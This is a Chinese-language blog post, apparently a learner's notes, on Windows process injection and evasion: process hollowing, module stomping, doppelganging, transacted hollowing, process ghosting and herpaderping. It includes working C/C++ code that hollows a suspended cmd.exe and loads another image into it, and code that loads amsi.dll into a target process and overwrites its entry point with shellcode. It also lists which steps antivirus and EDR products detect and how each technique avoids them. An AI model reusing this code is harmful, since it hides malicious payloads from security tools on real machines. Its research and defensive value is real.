<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.镂空已有进程模块：直接修改进程中已有模块的代码节，注入恶意代码</span><br><span class="line">2.先注入后镂空：注入一个合法dll(拥有合法签名)，然后修改dll入口点出代码为自己想执行的代码</span><br></pre></td></tr></table></figure>



<h4 id="process-hollowing"><a href="#process-hollowing" class="headerlink" title="process hollowing"></a>process hollowing</h4><p><img src="https://www.malwarebytes.com/blog/images/uploads/2018/08/hollowing1-1_.png" alt="img"></p>
<p>可以看到进程中是没有fg.exe这一项的，比较隐蔽</p>
<p><img src="/2022/11/12/inject/image-20221019002721682.png" alt="image-20221019002721682"></p>
<p>大致流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.创建一个挂起的合法进程(CreateProcess  CREATE_SUSPENDED)</span><br><span class="line">2.清空新进程的内存数据(NtUnmapViewofSection)</span><br><span class="line">3.申请新的内存(VirtualAllocEx)</span><br><span class="line">4.向内存中写入shellcode(WriteProcessMemory)</span><br><span class="line">5.设置入口点(SetThreadContext)</span><br><span class="line">6.恢复进程执行shellcode(ResumeThread)</span><br></pre></td></tr></table></figure>



<p>实现</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* pNtUnmapViewOfSection)</span><span class="params">(HANDLE, PVOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">hollowing</span><span class="params">(<span class="keyword">char</span> path[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	PVOID FileBuffer;</span><br><span class="line">	HANDLE hFile;</span><br><span class="line">	DWORD FileReadSize;</span><br><span class="line">	DWORD dwFileSize;</span><br><span class="line"></span><br><span class="line">	PVOID RemoteImageBase;			<span class="comment">//peb中可执行映像的基址</span></span><br><span class="line">	PVOID RemoteProcessMemory;		<span class="comment">//镂空进程中分配的内存空间</span></span><br><span class="line"></span><br><span class="line">	STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;			<span class="comment">//进程句柄修改内存空间</span></span><br><span class="line">	CONTEXT ctx;</span><br><span class="line">	ctx.ContextFlags = CONTEXT_FULL;</span><br><span class="line">	si.cb = <span class="built_in"><span class="keyword">sizeof</span></span>(si);</span><br><span class="line">	<span class="comment">//创建一个挂起的进程</span></span><br><span class="line">	BOOL bRet = <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//给恶意代码分配内存空间</span></span><br><span class="line">	hFile = <span class="built_in">CreateFileA</span>(path, GENERIC_READ, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">	FileBuffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//将磁盘文件读取到申请的内存空间</span></span><br><span class="line">	<span class="built_in">ReadFile</span>(hFile, FileBuffer, dwFileSize, &amp;FileReadSize, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)FileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)(((DWORD)pNtHeader) + <span class="number">4</span>);</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取挂起进程的线程上下文</span></span><br><span class="line">	<span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//x86环境从ebx寄存器中获取peb地址，并从peb中目标进程的基址(偏移8个字节)到RemoteImageBase</span></span><br><span class="line">	<span class="comment">//可选头中的imagebase</span></span><br><span class="line">	<span class="built_in">ReadProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + <span class="number">8</span>), &amp;RemoteImageBase, <span class="built_in"><span class="keyword">sizeof</span></span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断文件预期加载地址是否被占用</span></span><br><span class="line">	pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">	<span class="comment">//挖空已加载的地址</span></span><br><span class="line">	<span class="keyword">if</span> ((SIZE_T)RemoteImageBase == pNtHeader-&gt;OptionalHeader.ImageBase)</span><br><span class="line">		<span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, RemoteImageBase);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//为可执行映像分配新内存，并写入文件头</span></span><br><span class="line">	RemoteProcessMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pOptionHeader-&gt;ImageBase, pOptionHeader-&gt;SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(pi.hProcess, RemoteProcessMemory, FileBuffer, pOptionHeader-&gt;SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//逐段写入</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pPEHeader-&gt;NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)FileBuffer + pDosHeader-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HEADERS) + i * <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_SECTION_HEADER));</span><br><span class="line">		<span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeader-&gt;VirtualAddress), (PVOID)((LPBYTE)FileBuffer + pSectionHeader-&gt;PointerToRawData), pSectionHeader-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//更改程序入口点</span></span><br><span class="line">	ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pOptionHeader-&gt;AddressOfEntryPoint);</span><br><span class="line">	<span class="built_in">WriteProcessMemory</span>(pi.hProcess, (PVOID)(ctx.Ebx + (<span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T) * <span class="number">2</span>)), &amp;pOptionHeader-&gt;ImageBase, <span class="built_in"><span class="keyword">sizeof</span></span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置线程上下文</span></span><br><span class="line">	<span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">	<span class="comment">//恢复挂起线程</span></span><br><span class="line">	<span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>不足之处</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Unmap 目标进程的exe模块，比较可疑，现在的杀软一般都会检测Unmap</span><br><span class="line">2.如果没有Unmap，而是直接覆写程序，那么覆写地址的页属性就不是共享的，也很可疑</span><br><span class="line">3.在内存中的pe映像与在硬盘中不同</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>规避流程</p>
<p><img src="/2022/11/12/inject/image-20221103233102407.png" alt="image-20221103233102407"></p>
<h4 id="dll-hollowing（Module-Stomping）"><a href="#dll-hollowing（Module-Stomping）" class="headerlink" title="dll hollowing（Module Stomping）"></a>dll hollowing（Module Stomping）</h4><p>先注入后镂空：注入一个合法dll(拥有合法签名)，然后修改dll入口点出代码为自己想执行的代码</p>
<p>优点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.不会分配RWX内存页面</span><br><span class="line">2.不会更改dll在目标进程中的权限</span><br><span class="line">3.shellcode被注入到合法的 Windows dll中</span><br></pre></td></tr></table></figure>

<p>缺点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReadProcessMemory/WriteProcessMemory  api调用通常是由调试器而不是正常程序使用。</span><br><span class="line">可以只用NtMapViewOfSection 将shellcode注入远程进程，减少对WriteProcessMemory的调用</span><br></pre></td></tr></table></figure>

<p>大致流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.远程注入一个系统dll</span><br><span class="line">2.获取该模块在目标进程的虚拟地址</span><br><span class="line">3.定位模块的入口点</span><br><span class="line">4.修改入口点为shellcode的入口点</span><br><span class="line">5.创建远程线程</span><br></pre></td></tr></table></figure>

<p>demo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Process32First(hSnapshot, &amp;pe))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (lstrcmpi(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				CloseHandle(hSnapshot);</span><br><span class="line">				<span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pe));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ModuleStomping</span><span class="params">(LPCTSTR lpszProcessName,<span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ModuleName[] = <span class="string">&quot;C:\\windows\\system32\\amsi.dll&quot;</span>;</span><br><span class="line">	HMODULE hModules[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">	SIZE_T hModulesSize = <span class="keyword">sizeof</span>(hModules);</span><br><span class="line">	DWORD dwhModulesSizeNeeded = <span class="number">0</span>;</span><br><span class="line">	DWORD dwmoduleNameSize = <span class="number">0</span>;</span><br><span class="line">	SIZE_T hModulesCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> rModuleName[<span class="number">128</span>] = &#123;&#125;;</span><br><span class="line">	HMODULE rModule = <span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//注入一个起始dll到远程进程</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(lpszProcessName));</span><br><span class="line">	<span class="comment">//分配待注入dll大小的内存空间</span></span><br><span class="line">	LPVOID lpBuffer = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(ModuleName), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="comment">//将dll写进 远程进程的内存空间</span></span><br><span class="line">	WriteProcessMemory(hProcess, lpBuffer, (LPVOID)ModuleName, <span class="keyword">sizeof</span>(ModuleName), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="comment">//显式加载</span></span><br><span class="line">	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="comment">//执行该dll</span></span><br><span class="line">	HANDLE dllThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, threadRoutine, lpBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(dllThread, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//枚举notepad加载的所有dll模块，存放到hModules数组中</span></span><br><span class="line">	EnumProcessModulesEx(hProcess, hModules, hModulesSize, &amp;dwhModulesSizeNeeded, LIST_MODULES_ALL);</span><br><span class="line">	hModulesCount = dwhModulesSizeNeeded / <span class="keyword">sizeof</span>(HMODULE);</span><br><span class="line">	<span class="comment">//循环所有dll找到我们刚刚load的 amsi.dll</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; hModulesCount; i++)&#123;</span><br><span class="line">		rModule = hModules[i];</span><br><span class="line">		GetModuleBaseNameA(hProcess, rModule, rModuleName, <span class="keyword">sizeof</span>(rModuleName));</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(rModuleName, <span class="string">&quot;amsi.dll&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取dll的程序入口点</span></span><br><span class="line">	DWORD headerBufferSize = <span class="number">0x1000</span>;		<span class="comment">//申请一页的内存空间</span></span><br><span class="line">	LPVOID peHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize);</span><br><span class="line"></span><br><span class="line">	ReadProcessMemory(hProcess, rModule, peHeader, headerBufferSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)peHeader;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)peHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	LPVOID dllEntryPoint = (LPVOID)(pNTHeader-&gt;OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)rModule);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//在dll的入口点写入shellcode</span></span><br><span class="line">	WriteProcessMemory(hProcess, dllEntryPoint, (LPCVOID)shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//执行shellcode</span></span><br><span class="line">	CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (PTHREAD_START_ROUTINE)dllEntryPoint, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	CloseHandle(dllThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>实现效果</p>
<p><img src="/2022/11/12/inject/image-20221020154416080.png" alt="image-20221020154416080"></p>
<p><img src="/2022/11/12/inject/image-20221020154716646.png" alt="image-20221020154716646"></p>
<p>看下这个线程的地址，执行的是我们的shellcode</p>
<p><img src="/2022/11/12/inject/image-20221020155051688.png" alt="image-20221020155051688"></p>
<h2 id="Process-Doppelganging"><a href="#Process-Doppelganging" class="headerlink" title="Process Doppelganging"></a>Process Doppelganging</h2><p>该方法在2017年的bh上提出</p>
<p>优点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.避免了特殊的内存操作，比如SuspendProcess 和 NtUnmapViewOfSection</span><br></pre></td></tr></table></figure>

<p><img src="https://www.malwarebytes.com/blog/images/uploads/2018/08/dopel1_.png" alt="img"></p>
<p>简要流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.打开一个正常文件，创建一个transaction(NtCreateTransaction)</span><br><span class="line">2.打开源程序句柄（CreateFileTransacted）</span><br><span class="line">3.向源程序句柄写入shellcode(CreateFile,CreateFileMapping,MapViewOfFile,VirtualAlloc,memcpy,WriteFile)</span><br><span class="line">4.根据此时的文件内容，创建一个section(NtCreateSection)</span><br><span class="line">5.回滚到修改事务之前的状态，抹去一系列更改操作(RollbackTransaction)</span><br><span class="line">6.通过刚刚创建的section，创建进程(NtCreateProcessEx)</span><br><span class="line">7.准备参数到目标进程(跨进程)</span><br><span class="line">8.创建初始线程(NtCreateThreadEx)，之后唤醒线程(NtResumeThread)</span><br></pre></td></tr></table></figure>

<p>在win10  复现失败</p>
<p><img src="/2022/11/12/inject/image-20221020165055844.png" alt="image-20221020165055844"></p>
<p>针对错误代码 <code>c0000022</code>  权限不足的问题，换一个 创建进程的api，<code>CreateProcessInternalW</code>，该api并没有在kernel32中导出，因此需要自己实现</p>
<p><a href="http://a-twisted-world.blogspot.com/2008/03/createprocessinternal-function.html">http://a-twisted-world.blogspot.com/2008/03/createprocessinternal-function.html</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//don&#x27;t forget to load functiond before use:</span></span><br><span class="line"><span class="comment">//load_kernel32_functions();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">BOOL</span> </span><br><span class="line">(WINAPI *CreateProcessInternalW)(HANDLE hToken, </span><br><span class="line">    LPCWSTR lpApplicationName, </span><br><span class="line">    LPWSTR lpCommandLine,</span><br><span class="line">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">    BOOL bInheritHandles,</span><br><span class="line">    DWORD dwCreationFlags, </span><br><span class="line">    LPVOID lpEnvironment, </span><br><span class="line">    LPCWSTR lpCurrentDirectory, </span><br><span class="line">    LPSTARTUPINFOW lpStartupInfo,</span><br><span class="line">    LPPROCESS_INFORMATION lpProcessInformation,</span><br><span class="line">    PHANDLE hNewToken</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">load_kernel32_functions</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hKernel32 = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32&quot;</span>);</span><br><span class="line">    CreateProcessInternalW = (<span class="built_in">BOOL</span> (WINAPI *)(HANDLE, LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION, PHANDLE)) <span class="built_in">GetProcAddress</span>(hKernel32,<span class="string">&quot;CreateProcessInternalW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (CreateProcessInternalW == <span class="literal">NULL</span>) <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而使用此api替换NTcreateprocess 的方法，结合process hollowing，衍生出了transacted hollowing</p>
<p>先简单来说下NTFS，我们可以在transaction中创建一个文件，在commit transaction之前，对于其他进程来说，这个文件是不可见的，比如（AV、edr）所以写入shellcode是较为隐蔽的一种方式</p>
<h2 id="Transacted-Hollowing"><a href="#Transacted-Hollowing" class="headerlink" title="Transacted Hollowing"></a>Transacted Hollowing</h2><p><a href="https://www.malwarebytes.com/blog/news/2018/08/process-doppelganging-meets-process-hollowing_osiris">https://www.malwarebytes.com/blog/news/2018/08/process-doppelganging-meets-process-hollowing_osiris</a></p>
<p><a href="https://github.com/hasherezade/transacted_hollowing">https://github.com/hasherezade/transacted_hollowing</a></p>
<p>大致流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.打开一个正常文件，创建一个transaction(NtCreateTransaction)</span><br><span class="line">2.打开源程序句柄（CreateFileTransacted）</span><br><span class="line">3.向源程序句柄写入shellcode(CreateFile,CreateFileMapping,MapViewOfFile,VirtualAlloc,memcpy,WriteFile)</span><br><span class="line">4.根据此时的文件内容，创建一个section(NtCreateSection)</span><br><span class="line">5.回滚到修改事务之前的状态，抹去一系列更改操作(RollbackTransaction)</span><br><span class="line">6.通过刚刚创建的section，创建挂起进程(CreateProcessInternalW)</span><br><span class="line">7.映射section到目标进程内存(NtMapViewOfSection) 返回shellcode在目标进程内存中的初始地址(sectionBaseAddress)</span><br><span class="line">8.设置进程参数并修补远程进程的peb(NtQueryInformationProcess)</span><br></pre></td></tr></table></figure>

<p>该方法结合了doppel的事物特性和 process hollowing，且通过api的替换修复了doppel中的权限不足的问题。</p>
<p><img src="https://www.malwarebytes.com/blog/images/uploads/2018/08/osildr1-2_.png" alt="img"></p>
<p>效果演示</p>
<p>创建的挂起进程为notepad.exe，指定payload为计算器，transaction file为 1.txt</p>
<p><img src="/2022/11/12/inject/image-20221026104451112.png" alt="image-20221026104451112"></p>
<h2 id="Process-Ghosting"><a href="#Process-Ghosting" class="headerlink" title="Process Ghosting"></a>Process Ghosting</h2><p><a href="https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack">https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack</a></p>
<p><a href="https://github.com/hasherezade/process_ghosting">https://github.com/hasherezade/process_ghosting</a></p>
<p>在Windows中，如果映射可执行程序到内存中，那么可执行程序就不应该被修改，如果尝试修改返回错误。</p>
<p>这个限制针对已经映射到内存中的程序。 process ghosting利用了其中的设计缺陷，以<code>Generic_read</code>和<code>Generic_write</code>权限打开文件，对其设置删除标志，将shellcode写入到文件中，然后映射文件到内存中，最后删除这个文件。</p>
<p><img src="/2022/11/12/inject/image-20221025142025472.png" alt="image-20221025142025472"></p>
<p>实现步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.打开文件 (NtOpenFile)</span><br><span class="line">2.设置删除标志 (NtSetInformationFile  FILE_DISPOSITION_INFORMATION.DeleteFile = true)</span><br><span class="line">3.修改文件写入shellcode(NtWriteFile)</span><br><span class="line">4.创建section(NtCreateSection)</span><br><span class="line">5.关闭删除挂起句柄，删除文件(NtClose)</span><br><span class="line">6.使用section创建一个进程(NtCreateProcess)</span><br></pre></td></tr></table></figure>



<p>在Windows上删除文件有多种方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.在旧文件上创建一个新文件，并设置 FILE_SUPERSEDE 或 CREATE_ALWAYS flag</span><br><span class="line">2.在创建文件时设置 FILE_DELETE_ON_CLOSE 或 FILE_FLAG_DELETE_ON_CLOSE flag</span><br><span class="line">3.通过 NtSetInformationFile 调用FileDispositionInformation文件信息类时，将FILE_DISPOSITION_INFORMATION结构中的Deletefile设置为true</span><br></pre></td></tr></table></figure>

<p>这里采用了第三种方法</p>
<p>这里会创建一个tmp文件，是一个检测点</p>
<p><img src="/2022/11/12/inject/image-20221024162837016.png" alt="image-20221024162837016"></p>
<p>修改进程参数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">RtlCreateProcessParametersEx</span>(&amp;processParameters, &amp;uTargetFile, &amp;uDllPath, <span class="literal">NULL</span>,</span><br><span class="line">		&amp;uTargetFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, RTL_USER_PROC_PARAMS_NORMALIZED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在目标进程为参数分配内存</span></span><br><span class="line">	PVOID paramBuffer = processParameters;</span><br><span class="line">	SIZE_T paramSize = processParameters-&gt;EnvironmentSize + processParameters-&gt;MaximumLength;</span><br><span class="line">	<span class="comment">//为paramBuffer分配内存</span></span><br><span class="line">	status = <span class="built_in">NtAllocateVirtualMemory</span>(hProcess, &amp;paramBuffer, <span class="number">0</span>, &amp;paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">perror</span>(<span class="string">&quot;[-] Unable To Allocate Memory For Process Parameters...\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Allocated Memory For Parameters %p\n&quot;</span>, paramBuffer);</span><br><span class="line">	<span class="comment">// 将进程参数写入目标进程</span></span><br><span class="line">	status = <span class="built_in">NtWriteVirtualMemory</span>(hProcess, processParameters, processParameters,</span><br><span class="line">	processParameters-&gt;EnvironmentSize + processParameters-&gt;MaximumLength, <span class="literal">NULL</span>);</span><br><span class="line">	PEB* remotePEB;</span><br><span class="line">	remotePEB = (PEB*)pbi.PebBaseAddress;</span><br><span class="line">	<span class="comment">// 修改目标进程peb的进程参数</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, &amp;remotePEB-&gt;ProcessParameters, &amp;processParameters, <span class="built_in"><span class="keyword">sizeof</span></span>(PVOID), <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">perror</span>(<span class="string">&quot;[-] Error Updating Process Parameters!!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>























<h2 id="Ghostly-Hollowing"><a href="#Ghostly-Hollowing" class="headerlink" title="Ghostly Hollowing"></a>Ghostly Hollowing</h2><p>和transacted hollowing类似，将创建进程那一部分</p>
<p><a href="https://github.com/hasherezade/transacted_hollowing">https://github.com/hasherezade/transacted_hollowing</a></p>
<p><img src="/2022/11/12/inject/image-20221024230139418.png" alt="image-20221024230139418"></p>
<p>大致步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.打开文件 (NtOpenFile)</span><br><span class="line">2.设置删除标志 (NtSetInformationFile  FILE_DISPOSITION_INFORMATION.DeleteFile = true)</span><br><span class="line">3.修改文件写入shellcode(NtWriteFile)</span><br><span class="line">4.创建section(NtCreateSection)</span><br><span class="line">5.关闭删除挂起句柄，删除文件(NtClose)</span><br><span class="line">6.使用section创建一个进程(NtCreateProcess)</span><br><span class="line">7.分配进程参数和环境变量(RtlCreateProcessParametersEx、NtAllocateVirtualMemory)</span><br><span class="line">8.创建线程在进程中执行(NtCreateThread)</span><br></pre></td></tr></table></figure>











<h2 id="process-Herpaderping"><a href="#process-Herpaderping" class="headerlink" title="process Herpaderping"></a>process Herpaderping</h2><p><a href="https://github.com/jxy-s/herpaderping">https://github.com/jxy-s/herpaderping</a></p>
<p><img src="/2022/11/12/inject/image-20221027234502944.png" alt="image-20221027234502944"></p>
<p>根据上图，可以看到该方法的大致流程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.打开文件 (CreateFile)</span><br><span class="line">2.向文件写入payload(WriteFile)</span><br><span class="line">3.创建section映射到内存(NtCreateSection，SEC_IMAGE)</span><br><span class="line">4.创建进程A(NtCreateProcessEx)</span><br><span class="line">5.向第二步中的同一个文件写入任意内容比如字符串</span><br><span class="line">6.关闭并保存文件为xx.tmp ，文件保存到磁盘，磁盘的内容是上一步写的字符串()</span><br><span class="line">7.准备进程参数并创建线程()</span><br></pre></td></tr></table></figure>



<p>该方法通过在映射到内存后修改磁盘上的内容来掩盖进程的目的，关键步骤是 向文件写入shellcode映射到内存后再修改磁盘上的文件。</p>
<p><img src="/2022/11/12/inject/image-20221028004227315.png" alt="image-20221028004227315"></p>
<p><img src="/2022/11/12/inject/image-20221028004250790.png" alt="image-20221028004250790"></p>
<p><img src="/2022/11/12/inject/image-20221028093107278.png" alt="image-20221028093107278"></p>
<p>计算器被写入目标文件</p>
<p><img src="/2022/11/12/inject/image-20221028093423776.png" alt="image-20221028093423776"></p>
<p>目标文件被映射到内存中，实际上映射的是上一步中的计算器</p>
<p><img src="/2022/11/12/inject/image-20221028093454512.png" alt="image-20221028093454512"></p>
<p>计算器通过tmp文件执行</p>
